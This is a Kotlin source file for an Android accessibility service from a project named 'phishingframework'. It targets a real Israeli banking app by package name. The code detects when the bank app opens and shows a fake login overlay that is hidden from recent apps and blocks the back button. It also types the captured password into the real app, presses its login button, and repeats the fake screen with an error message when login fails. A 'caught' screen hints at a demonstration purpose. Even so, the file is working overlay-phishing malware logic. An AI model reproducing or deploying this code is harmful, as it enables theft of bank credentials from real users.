package com.example.phishingframework.services

import android.accessibilityservice.AccessibilityService
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.content.ContextCompat
import com.example.phishingframework.activities.CaughtActivity
import com.example.phishingframework.activities.PhishingOverlayActivity
import com.example.phishingframework.utils.Constants

//Class purpose:
//To detect the opening of the target application = bank (com.ideomobile.mercantile)
//To display a fake screen over the real application
//To automatically inject the captured password back into the real application
//To handle login failures and display the phishing screen again
class PhishingAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "PhishingService"
        private const val ACTION_INJECT_PASSWORD = "com.example.phishingframework.ACTION_INJECT_PASSWORD"
    }

    private val handler = Handler(Looper.getMainLooper())

    // Simple variable that prevents duplicate display
    private var overlayShown = false
    private var userLoggedIn = false

    // Last time we showed overlay - to prevent duplicate displays
    private var lastOverlayShowTime = 0L

    // Track login attempt
    private var loginAttemptTime = 0L

    // For saving password for injection
    private var injectedPassword: String = ""
    private lateinit var injectorReceiver: BroadcastReceiver
    private var wasLoggedInSuccessfully = false
    private var showingCaughtScreen = false

    //Called when the service connects to the Android system
    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "Service Connected")

        // Register receiver to get password
        injectorReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                injectedPassword = intent.getStringExtra("password") ?: ""
                Log.i(TAG, "Received password for injection")

                // Mark that we're in the process of re-login
                overlayShown = false
                userLoggedIn = true

                // After receiving the password, inject it automatically
                if (injectedPassword.isNotEmpty()) {
                    handler.postDelayed({
                        injectPasswordToRealApp()
                    }, 1000)
                }
            }
        }

        //IntentFilter is a "filter" that determines what type of messages the Receiver will listen to
        //Here we're saying: "Listen only to messages of type ACTION_INJECT_PASSWORD"
        // The object that will handle messages when they arrive - located at the beginning of the function.
        val filter = IntentFilter(ACTION_INJECT_PASSWORD)
        ContextCompat.registerReceiver(
            this,
            injectorReceiver,
            filter,
            ContextCompat.RECEIVER_NOT_EXPORTED
        )
    }

    // Called every time an accessibility event occurs in the system
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        // Filter only window change events
        //Without this filtering, the phishing screen would appear dozens of times per moment, with every small user click
        //TYPE_WINDOW_STATE_CHANGED - includes opening a new application, switching between applications, returning to home screen, opening dialog/popup
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return

        val pkg = event.packageName?.toString() ?: return
        Log.i(TAG, "Window changed to: $pkg")

        if (pkg == packageName) return

        val ignoredPackages = setOf(
            "com.android.systemui",
            "com.samsung.android.honeyboard",
            "com.google.android.inputmethod.latin",
            "com.android.inputmethod.latin"
        )
        if (pkg in ignoredPackages) return

        when (pkg) {
            Constants.TARGET_PACKAGE -> {
                // Check if this is the login screen after successful login
                if (wasLoggedInSuccessfully && !showingCaughtScreen) {
                    handler.postDelayed({
                        checkIfBackToLoginScreen()
                    }, 1000)
                    return
                }

                val currentTime = System.currentTimeMillis()
                if (currentTime - lastOverlayShowTime < 1000) {
                    Log.i(TAG, "Ignoring duplicate event - too soon")
                    return
                }

                // If the real application opens and we haven't shown overlay yet and haven't logged in
                if (!overlayShown && !userLoggedIn) {
                    overlayShown = true
                    lastOverlayShowTime = currentTime

                    handler.postDelayed({
                        showPhishingOverlay()
                    }, 100)
                } else if (userLoggedIn && loginAttemptTime > 0) {
                    // If we tried to log in, check if we failed
                    if (currentTime - loginAttemptTime > 2000) {
                        checkForLoginFailure()
                    }
                }
            }

            "com.sec.android.app.launcher" -> {
                // Return to Home - reset state
                resetState()
            }

            else -> {
                // Any other application - reset state
                if (pkg != packageName) {
                    resetState()
                }
            }
        }
    }

    private fun resetState() {
        overlayShown = false
        userLoggedIn = false
        loginAttemptTime = 0L
        injectedPassword = ""
        wasLoggedInSuccessfully = false
        showingCaughtScreen = false
    }

    private fun checkIfBackToLoginScreen() {
        val root = rootInActiveWindow ?: return

        // Check if we see the login button - sign that we returned to login screen
        val loginButtons = root.findAccessibilityNodeInfosByViewId(
            "com.ideomobile.mercantile:id/LoginButton"
        )

        if (loginButtons.isNotEmpty()) {
            Log.i(TAG, "User logged out and back to login screen - showing caught screen")
            showingCaughtScreen = true

            handler.postDelayed({
                showCaughtScreen()
            }, 3000)
        }
    }

    private fun showCaughtScreen() {
        Log.i(TAG, "Showing 'caught' screen")

        val intent = Intent(this, CaughtActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
        }
        startActivity(intent)
    }

    private fun showPhishingOverlay() {
        Log.i(TAG, "Showing phishing overlay")

        val intent = Intent(this, PhishingOverlayActivity::class.java).apply {
            //Creates a new "task" (Task) in the system, allows opening Activity from Service (without this it doesn't work!)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            //Deletes all existing Activities in the task, makes the phishing screen the only one in the stack - ensures the user can't press "back" and return to the real bank application
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
            //If phishing screen already exists, doesn't create another one, prevents duplicates of the same screen
            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            //Hides the phishing screen from the recent applications list, when the user presses "recent apps" button - they don't see the phishing screen
            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
        }
        startActivity(intent)
    }

    private fun showPhishingOverlay(errorMessage: String? = null) {
        Log.i(TAG, "Showing phishing overlay" + if (errorMessage != null) " with error: $errorMessage" else "")

        val intent = Intent(this, PhishingOverlayActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
            addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)

            errorMessage?.let {
                putExtra("error_message", it)
            }
        }
        startActivity(intent)
    }

    private fun checkForLoginFailure() {
        val root = rootInActiveWindow ?: return

        // Check if we still see the login button - sign that we didn't log in
        val loginButtons = root.findAccessibilityNodeInfosByViewId(
            "com.ideomobile.mercantile:id/LoginButton"
        )

        if (loginButtons.isNotEmpty()) {
            Log.i(TAG, "Login failed - still on login screen")

            // Reset state
            overlayShown = false
            userLoggedIn = false
            loginAttemptTime = 0L

            handler.postDelayed({
                showPhishingOverlay("הסיסמה שהזנת שגויה, אנא נסה שוב")
            }, 500)
        } else {
            loginAttemptTime = 0L
            wasLoggedInSuccessfully = true
            Log.i(TAG, "Login successful - marking for later detection")
        }
    }

    private fun injectPasswordToRealApp() {
        Log.i(TAG, "Attempting to inject password")

        //rootInActiveWindow returns the root of the currently active window
        val root = rootInActiveWindow
        if (root == null) {
            Log.w(TAG, "No root window available")
            return
        }

        //Search for password field
        //Every component in Android interface can get a unique identifier
        //text_input_edit_text_layout = component name of the password field
        val passwordNodes = root.findAccessibilityNodeInfosByViewId(
            "com.ideomobile.mercantile:id/text_input_edit_text_layout"
        )

        if (passwordNodes.isEmpty()) {
            Log.w(TAG, "Password field not found")
            return
        }

        val passwordNode = passwordNodes[0]

        // Action that gives "focus" to component (like clicking on it)
        //Android system allows text input only to component that has focus
        passwordNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS)

        // Password input
        //Constant that defines the parameter as "text we want to input" -ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE
        //Android knows this value should go into the text field
        val arguments = android.os.Bundle()
        arguments.putCharSequence(
            AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
            injectedPassword
        )

        //Accessibility action that inputs text to component
        //Similar to keyboard typing, but direct
        passwordNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)

        Log.i(TAG, "Password injected successfully")

        handler.postDelayed({
            val loginButtons = root.findAccessibilityNodeInfosByViewId(
                "com.ideomobile.mercantile:id/LoginButton"
            )
            if (loginButtons.isNotEmpty()) {
                loginButtons[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.i(TAG, "Login button clicked")

                userLoggedIn = true
                loginAttemptTime = System.currentTimeMillis()
            }
        }, 300)

        overlayShown = false
        injectedPassword = ""
    }

    override fun onInterrupt() {
        Log.i(TAG, "Service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(injectorReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering receiver", e)
        }
    }
}